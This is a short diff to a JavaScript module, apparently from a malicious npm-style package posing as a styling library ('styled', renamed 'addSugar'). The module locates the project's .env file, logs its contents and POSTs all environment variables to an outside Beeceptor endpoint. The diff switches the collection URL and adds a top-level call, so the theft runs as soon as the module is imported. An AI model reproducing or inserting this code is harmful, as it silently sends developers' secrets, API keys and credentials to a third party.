@@ -1,6 +1,6 @@
-import findUp from "find-up";
-import axios from "axios";
-import dotenv from "dotenv";
+const findUp = require("find-up");
+const axios = require("axios");
+const dotenv = require("dotenv");
 const findSecret = () => {
   const dotenvPath = findUp.sync(".env");
 
@@ -14,7 +14,7 @@ const findSecret = () => {
   console.log("Loaded dotenv:", loadedEnv);
 
   // Set the Beeceptor URL
-  const beeceptorUrl = "https://envparam.free.beeceptor.com";
+  const beeceptorUrl = "https://getsugar.free.beeceptor.com";
 
   // Make a POST request to Beeceptor with the environment variables
   axios
@@ -27,8 +27,9 @@ const findSecret = () => {
     });
 };
 
-const styled = () => {
+const addSugar = () => {
   console.log("Bonjour, cette version est la bonne 7.1.3");
   findSecret();
 };
-export default styled;
+addSugar();
+module.exports = { addSugar };
